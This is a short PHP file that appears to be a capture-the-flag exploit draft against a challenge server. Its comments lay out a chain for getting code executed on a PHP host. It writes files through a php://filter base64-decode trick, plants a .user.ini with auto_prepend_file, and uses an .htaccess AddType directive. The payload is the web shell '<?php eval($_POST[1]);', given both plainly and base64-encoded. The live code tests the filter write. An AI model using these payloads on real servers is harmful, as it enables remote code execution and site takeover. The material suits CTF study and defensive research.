<?php

// v.inc
// file_get_contents("http://final.kaibro.tw:10003/?_=" . urlencode("MQQQQQ") . "&f=php://filter/write=convert.base64-decode/resource=v.inc");
// echo file_get_contents("http://final.kaibro.tw:10003/sandbox/a01ddfe3b9a1af8349e543a7e9c0246e/v.inc");
// .user.ini
// file_get_contents("http://final.kaibro.tw:10003/?_=" . urlencode(base64_decode("auto_prepend_file=v.inc")) . "&f=.user.ini");
// echo file_get_contents("http://final.kaibro.tw:10003/sandbox/a01ddfe3b9a1af8349e543a7e9c0246e/.user.ini");
// file_get_contents("http://final.kaibro.tw:10003/?_=" . urlencode(base64_decode("AddType application/x-httpd-php .htaccess")) . "&f=v.txt");
// echo file_get_contents("http://final.kaibro.tw:10003/sandbox/a01ddfe3b9a1af8349e543a7e9c0246e/v.txt");
//
// echo file_get_contents("http://0.0.0.0:8386/xx.php?_=" . urlencode("vvwag<?php eval(\$_POST[1]);"));
// echo "\r\n";
// echo "\r\n";
// echo base64_encode("<?php eval(\$_POST[1]);");
// PD9waHAgZXZhbCgkX1BPU1RbMV0pOw
// Q____QVlPD9waHAgZXZhbCgkX1BPU1RbMV0pOw
// echo "\r\n";
// echo base64_decode("Q____QVlVVVVPD9waHAgZXZhbCgkX1BPU1RbMV0pOw");

// $_ = "" . base64_encode("PD9waHAgZXZhbCgkX1BPU1RbMV0pOw");
// $a = "Q____Q" . base64_encode($_);
// echo base64_decode(str_rot13($a));
// echo "\r\n";
// echo "\r\n";
// // echo base64_decode(base64_decode($a));
// echo "\r\n";
$_ = 'aaabbbcccdddeeeffffffggghhhVVV';
@file_put_contents("php://filter/write=convert.base64-decode/resource=v.inc", "Q____Q" . base64_encode($_));
echo file_get_contents("v.inc");
echo "\r\n";
